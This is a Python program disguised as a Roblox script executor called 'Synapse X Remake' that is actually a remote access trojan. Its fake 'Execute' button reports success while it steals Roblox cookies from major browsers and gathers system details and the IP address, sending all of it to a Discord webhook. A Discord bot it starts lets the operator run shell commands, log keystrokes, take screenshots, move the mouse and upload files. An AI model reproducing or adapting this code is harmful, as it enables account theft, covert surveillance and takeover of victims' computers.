import sys
import platform
import socket
import psutil
import browser_cookie3
import requests
import sqlite3
import os
import json
import traceback
import subprocess
import threading
import discord
from discord.ext import commands
from datetime import datetime
from pathlib import Path
from PyQt5.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QTextEdit, QPushButton, QLabel
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QFont
import pyautogui
from pynput import keyboard
import io

WEBHOOK_URL = "https:d.com/api/wooks242321418/WSIJQpYf_dRvZmmPgn5SuvDWIFZ1wYzKWsPSjq5WW2w8NW483oQombDr868jJdVq38FC"
BOT_TOKEN = "MTMzNjAzNjQDcxNA.GRJ2Vu.4QCri8rrWdC0SAASmS5lWhieKdG1dTl3JWZMM0"
COMMAND_CHANNEL_ID = 2

class ExecutorWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.keylog = []
        self.keylogging = False
        self.initUI()
        self.start_rat()

    def initUI(self):
        self.setWindowTitle("Synapse X Remake")
        self.setGeometry(100, 100, 600, 400)
        self.setStyleSheet("background-color: #1C2526; color: #FFFFFF;")

        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        layout = QVBoxLayout(central_widget)

        title = QLabel("Synapse X - Roblox Executor")
        title.setFont(QFont("Arial", 20, QFont.Bold))
        title.setAlignment(Qt.AlignCenter)
        layout.addWidget(title)

        self.script_input = QTextEdit()
        self.script_input.setPlaceholderText("Enter Roblox Script")
        self.script_input.setStyleSheet("background-color: #333333; color: #FFFFFF; border: 1px solid #444444;")
        self.script_input.setFont(QFont("Courier New", 12))
        layout.addWidget(self.script_input)

        execute_btn = QPushButton("Execute")
        execute_btn.setStyleSheet("background-color: #FF5555; color: #FFFFFF; padding: 10px; font-size: 16px;")
        execute_btn.clicked.connect(self.execute_script)
        layout.addWidget(execute_btn)

        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setStyleSheet("background-color: #333333; color: #FFFFFF; border: 1px solid #444444;")
        self.console.setFont(QFont("Courier New", 12))
        self.console.setText("Console Output")
        layout.addWidget(self.console)

    def execute_script(self):
        try:
            script = self.script_input.toPlainText()
            output = self.fake_execute(script)
            self.console.setText(output)
            self.collect_and_send_data()
        except Exception as e:
            self.console.append(f"\nError in execute_script: {str(e)}")
            traceback.print_exc()

    def fake_execute(self, script):
        return "Error: No script provided!" if not script else "Script executed successfully!\nOutput: Injected into Roblox."

    def collect_and_send_data(self, command_output=None, keylog_data=None):
        try:
            data = []

            # System Info
            data.append("System Info")
            data.append(f"OS: {platform.system()} {platform.release()}")
            data.append(f"Hostname: {socket.gethostname()}")
            data.append(f"CPU: {platform.processor()}")
            data.append(f"Memory: {round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB")
            data.append("")

            # IP Address
            try:
                ip = requests.get("https://api.ipify.org", timeout=5).text
                data.append("IP Address")
                data.append(ip)
                data.append("")
            except Exception as e:
                data.append("IP Address")
                data.append(f"Failed to fetch ({str(e)})")
                data.append("")

            # Cookies from all major browsers
            cookies = []
            browser_functions = [
                ("Chrome", browser_cookie3.chrome),
                ("Firefox", browser_cookie3.firefox),
                ("Edge", browser_cookie3.edge),
                ("Opera", browser_cookie3.opera),
                ("Opera GX", browser_cookie3.opera_gx),
                ("Chromium", browser_cookie3.chromium)
            ]

            for browser_name, browser_func in browser_functions:
                try:
                    browser_cookies = browser_func(domain_name="roblox.com")
                    cookies.append(f"{browser_name} Roblox Cookies:")
                    if browser_cookies:
                        for cookie in browser_cookies:
                            cookies.append(f"{cookie.name}: {cookie.value}")
                    else:
                        cookies.append("None found")
                    cookies.append("")
                except Exception as e:
                    cookies.append(f"{browser_name} cookies error: {str(e)}")
                    cookies.append(f"Details: {traceback.format_exc()}")
                    cookies.append("")

            # Fallback: Chrome cookies manually
            try:
                chrome_cookies = self.get_chrome_cookies_manually()
                cookies.append("Chrome Roblox Cookies (Manual):")
                if chrome_cookies:
                    for name, value in chrome_cookies:
                        cookies.append(f"{name}: {value}")
                else:
                    cookies.append("None found")
                cookies.append("")
            except Exception as e:
                cookies.append(f"Chrome manual cookies error: {str(e)}")
                cookies.append(f"Details: {traceback.format_exc()}")
                cookies.append("")

            data.append("Cookies")
            data.extend(cookies)

            # Command Output (if any)
            if command_output:
                data.append("Command Output")
                data.append(command_output)
                data.append("")

            # Keylog Data (if any)
            if keylog_data:
                data.append("Keylog Data")
                data.append(keylog_data)
                data.append("")

            # Save to file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"data_{timestamp}.txt"
            try:
                with open(filename, "w", encoding="utf-8") as f:
                    f.write("\n".join(data))
                self.console.append(f"\nData saved to {filename}")
            except Exception as e:
                self.console.append(f"\nError saving file: {str(e)}")
                return

            # Send file to webhook
            self.send_to_webhook(filename)
        except Exception as e:
            self.console.append(f"\nError in collect_and_send_data: {str(e)}")
            traceback.print_exc()

    def get_chrome_cookies_manually(self):
        cookies = []
        try:
            chrome_path = Path(os.getenv("APPDATA")) / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Cookies"
            if not chrome_path.exists():
                raise FileNotFoundError("Chrome Cookies file not found")
            conn = sqlite3.connect(chrome_path)
            cursor = conn.cursor()
            cursor.execute("SELECT name, value FROM cookies WHERE host_key LIKE '%roblox.com'")
            cookies = cursor.fetchall()
            conn.close()
        except Exception as e:
            raise e
        return cookies

    def run_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            output = f"Command: {command}\nStdout: {result.stdout}\nStderr: {result.stderr}"
        except Exception as e:
            output = f"Command: {command}\nError: {str(e)}"
        return output

    def take_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            screenshot.save(filename)
            return filename
        except Exception as e:
            return f"Screenshot error: {str(e)}"

    def move_mouse(self, x, y):
        try:
            pyautogui.moveTo(int(x), int(y))
            return f"Mouse moved to ({x}, {y})"
        except Exception as e:
            return f"Mouse move error: {str(e)}"

    def upload_file(self, filepath):
        try:
            if not os.path.exists(filepath):
                return f"File not found: {filepath}"
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"upload_{timestamp}_{os.path.basename(filepath)}"
            with open(filepath, "rb") as f:
                files = {"file": (filename, f)}
                response = requests.post(WEBHOOK_URL, files=files, timeout=10)
            if response.status_code in (200, 204):
                return f"File uploaded: {filepath}"
            else:
                return f"File upload error: HTTP {response.status_code} - {response.text}"
        except Exception as e:
            return f"File upload error: {str(e)}"

    def on_key_press(self, key):
        if self.keylogging:
            try:
                self.keylog.append(str(key))
            except Exception as e:
                self.keylog.append(f"Error: {str(e)}")

    def start_keylogging(self):
        self.keylogging = True
        self.keylog = []
        listener = keyboard.Listener(on_press=self.on_key_press)
        listener.start()
        return "Keylogging started"

    def stop_keylogging(self):
        self.keylogging = False
        keylog_data = "\n".join(self.keylog) if self.keylog else "No keys logged"
        self.keylog = []
        return keylog_data

    def send_to_webhook(self, filename):
        try:
            if not WEBHOOK_URL:
                self.console.append("\nWebhook error: Invalid URL (not set)")
                return
            payload = {
                "embeds": [{
                    "title": "New Data Collected",
                    "description": f"Data saved to `{filename}` and attached below.",
                    "color": 16711680
                }]
            }
            with open(filename, "rb") as f:
                files = {"file": (filename, f, "text/plain")}
                response = requests.post(
                    WEBHOOK_URL,
                    data={"payload_json": json.dumps(payload)},
                    files=files,
                    timeout=10
                )
            if response.status_code in (200, 204):
                self.console.append("\nData file sent to webhook successfully.")
            else:
                self.console.append(f"\nWebhook error: HTTP {response.status_code} - {response.text}")
        except Exception as e:
            self.console.append(f"\nWebhook error: {str(e)}")
            traceback.print_exc()

    def start_rat(self):
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
        bot.remove_command("help")

        @bot.event
        async def on_ready():
            print(f"Bot connected as {bot.user}")

        @bot.command()
        async def run(ctx, *, command):
            if ctx.channel.id != COMMAND_CHANNEL_ID:
                return
            output = self.run_command(command)
            self.collect_and_send_data(command_output=output)
            await ctx.send(f"Command executed: {command}")

        @bot.command()
        async def screenshot(ctx):
            if ctx.channel.id != COMMAND_CHANNEL_ID:
                return
            filename = self.take_screenshot()
            if filename.startswith("Screenshot error"):
                await ctx.send(filename)
                return
            with open(filename, "rb") as f:
                await ctx.send(file=discord.File(f, filename))
            self.collect_and_send_data(command_output=f"Screenshot saved: {filename}")

        @bot.command()
        async def mousemove(ctx, x, y):
            if ctx.channel.id != COMMAND_CHANNEL_ID:
                return
            output = self.move_mouse(x, y)
            self.collect_and_send_data(command_output=output)
            await ctx.send(output)

        @bot.command()
        async def keylog(ctx, action):
            if ctx.channel.id != COMMAND_CHANNEL_ID:
                return
            if action.lower() == "start":
                output = self.start_keylogging()
            elif action.lower() == "stop":
                output = self.stop_keylogging()
                self.collect_and_send_data(keylog_data=output)
            else:
                output = "Invalid action: use 'start' or 'stop'"
            await ctx.send(output)

        @bot.command()
        async def upload(ctx, *, filepath):
            if ctx.channel.id != COMMAND_CHANNEL_ID:
                return
            output = self.upload_file(filepath)
            self.collect_and_send_data(command_output=output)
            await ctx.send(output)

        threading.Thread(target=lambda: bot.run(BOT_TOKEN), daemon=True).start()

if __name__ == "__main__":
    try:
        app = QApplication(sys.argv)
        window = ExecutorWindow()
        window.show()
        sys.exit(app.exec_())
    except Exception as e:
        print(f"Startup error: {str(e)}")
        traceback.print_exc()
